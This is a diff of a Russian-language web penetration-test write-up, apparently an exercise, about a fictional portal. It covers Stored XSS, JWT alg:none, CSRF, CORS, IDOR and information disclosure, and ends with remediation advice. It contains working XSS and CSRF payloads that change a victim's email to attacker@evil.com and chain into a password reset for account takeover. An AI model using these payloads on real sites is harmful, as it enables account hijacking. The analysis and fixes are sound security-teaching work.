@@ -16,8 +16,6 @@ Origin: https://portal.targetcorp.com
 {"display_name": "<img src=x onerror=alert(document.domain)>", "bio": "Test user"}
 ```
 
-Здесь атакующий использует классический payload для Stored XSS, так же меня очень сильно смущает JWT токен, в том плане что его подпись слишком короткая
-
 Ответ 1:
 HTTP/1.1 200 OK
 Content-Type: application/json
@@ -25,8 +23,6 @@ Access-Control-Allow-Origin: https://portal.targetcorp.com
 Access-Control-Allow-Credentials: true
  
 {"status": "ok", "message": "Profile updated"}
-
-При этом API успешно обработало такой ввод и приняло, отображаемое имя как `<img src=x onerror=alert(document.domain)>`, тогда если парсер на HTML странице будет отображать это не как текст, в этом случае уязвимости быть не должно, но если он вставляется например как innerHTML а не plainText, тогда это будет Stored XSS
 
 -----------------------------------------------------------------------------------------------------------------
 Запрос 2 — Просмотр профиля пользователя:
@@ -54,7 +50,6 @@ X-Powered-By: Express
 </html>
  ```
 
-да в результате мы получаем что парсер просто вставил пользовательский ввод, при этом ничего не изменив
 
 -----------------------------------------------------------------------------------------------------------------
 Запрос 3 — Смена email:
@@ -125,7 +120,7 @@ Content-Type: application/json
 
 
 
-1. Найденные уязвимости:
+
 1 - На мой взгляд стоит рассматривать запросы 1 и 2 в совокупности потому что там отражена первая уязвимость, а именно Stored XSS, это произошло потому что парсер внутри Node.js, просто вставил пользовательский ввод, чего быть не должно, в результате мы получаем такую уязвимость
 Шаги Эксплуатации:
 Так как WAF пропустил запрос полностью, мне кажется можно не использовать техники для его обхода, поэтому я предложу payload с HackTricks `<img src=x onerror=fetch('/api/v1/account/change-email', {method:'POST', body:'new_email=hacked@evil.com'})>`, по факту можем сразу можем поменять почту потому что это sameorigin
@@ -138,7 +133,7 @@ Content-Type: application/json
 Очень сильно зависит от версии Node.js
 3 - В запросах 1-6 фигурирует очень странная подпись JWT токена
 eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEwNSwidXNlcm5hbWUiOiJhdHRhY2tlciIsInJvbGUiOiJ1c2VyIn0.xYz123 
-{  "alg": "HS256",  "typ": "JWT"} { "sub": "1234567890",  "name": "John Doe",  "admin": true,  "iat": 1516239022}, подпись очень короткая, для HS256, по моему она больше 30 или 32 символов
+{ "alg": "HS256"} {"uid": 105,"username": "attacker","role": "user"}, подпись очень короткая, для HS256, по моему она больше 30+ или 32+ символов, попробовал сделать брутфорс по rockyou, и результатов не дало, возможно это просто заглушка а не подпись. 
 Шаги эксплуатации
 Можно попробовать классическую JWT атаку `"alg": "none"`  если сервер не проверяет подпись можем изменить значение и попробовать отправить хотя у нас уже пользователь с админскими правами
 Риск:
@@ -149,4 +144,41 @@ eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEwNSwidXNlcm5hbWUiOiJhdHRhY2tlciIsInJvbGUiOiJ1c2V
 ```
 <html> <body> <form method="POST" action="https://portal.targetcorp.com/api/v1/account/change-email" enctype="application/x-www-form-urlencoded"> <input type="hidden" name="new_email" value="hacked@evil.com"> </form> <script>document.forms[0].submit()</script> </body> </html>
 ```
-Как только пользователь открыл страницу то сразу отправится запрос на смену почты, по идее это отражено в 4 запросе и атака пройдет 
+Как только пользователь открыл страницу то сразу отправится запрос на смену почты, по идее это отражено в 4 запросе и атака пройдет, можно сделать и не в слепую, потому что присутствуют Access-Control-Allow-Origin: https://evil-site.com
+Access-Control-Allow-Credentials: true, то есть мы можем читать ответы от сервиса на нашем https://evil-site.com 
+5 - Ошибка конфигурации CORS, здесь cors позволяет читать ответы от https://evil-site.com от https://portal.targetcorp.com, 
+Риск - обход sameorigin policy
+6 - IDOR в 6 запросе по идее мы имеем пользователя с id=105 (из 2 запроса GET /profile/105 HTTP/1.1 и jwt), а получить доступ можем к данным пользователя с id=1
+Шаги эксплуатации
+Запрос на `GET /api/v1/profile/* HTTP/1.1` ведет к компрометации пользователей, это раскрывает их данные: {"uid": 1, "username": "admin", "email": "admin@targetcorp.com",
+ "role": "administrator", "display_name": "Admin User",
+ "last_login": "2025-03-15T10:30:00Z"} что открывает возможности для соц инженерии или подделки JWT токена
+ Риски - раскрытие данных аккаунтов пользователей
+
+Цепочка эксплуатации для захвата произвольного аккаунта:
+Если бы мне нужен был захват произвольного аккаунта максимально быстро, и теория про JWT что .xYz123 это просто заглушка верна, тогда я бы использовал вектор IDOR -> JWT issue -> account take over, если вдруг на самом деле это какой то кастомный алгоритм проверки подписи можно использовать Stored XSS, тогда цепочка будет примерно такая 
+Stored XSS -> email Change -> Paswword Reset -> account take over, но это сработает только при посещении нашего профиля, эксплоит будет выглядеть примерно так: 
+```
+Запрос 1 — Обновление профиля:
+POST /api/v1/profile HTTP/1.1
+Host: portal.targetcorp.com
+Cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEwNSwidXNlcm5hbWUiOiJhdHRhY2tlciIsInJvbGUiOiJ1c2VyIn0.xYz123
+Content-Type: application/json
+Origin: https://portal.targetcorp.com
+
+
+{"display_name": "<img src=x onerror=\"fetch('/api/v1/account/change-email',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'new_email=attacker@evil.com'}).then(()=>fetch('/api/v1/account/reset-password',{method:'POST',headers:{'Content-Type':'application/json'},body: JSON..stringify({email: 'attacker@evil.com'})})))", "bio": "Test user"}
+```
+Когда пользователь посещает страницу тогда автоматически меняем почту и сбрасываем пароль
+
+Приведите рекомендации по устранению каждой найденной уязвимости
+1. StoredXSS возникает из за того что ввод пользователя попадает в html без экранирования, тогда если рендерит сервер нужно использовать экранирование при выводе, например использовать подобную функцию для санитизации вывода
+```
+const escapeHtml = (unsafe) => {return unsafe.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#x27;");}; 
+```
+либо какие то встроенные функции для санитизации, так же еще можно попробовать ограничить длину вводимого имени, можно еще попробовать поставить CSP с 'self' чтобы убрать работу внутренних скриптов в html 
+2. Для предотвращения Information Disclosur следует отключить отображение заголовка, либо как то отрезать все заголовки безопасности на этапе middleware, в лог допустим сохранять но пользователю не отдавать
+3. JWT использовать криптостойкий секрет, а не заглушку, потому что сейчас подпись больше похожа на заглушку, и если моя теория про `alg:none` верна то добавить обязательную проверку алгоритма на входе
+4. Необходимо добавить CSRF для всех методов, чтобы избежать несанкционированных действий от имени пользователя 
+5. Для CORS я бы добавил просто белый лист разрешенных доменов, чтобы исключить автоматическую подстановку cookie браузером
+6. IDOR возникает если сервер не проверяет имеет ли субъект доступ к объекту доступа, можно добавить проверку, например если requst.userId == page.userId разрешить доступ в ином случае 403 
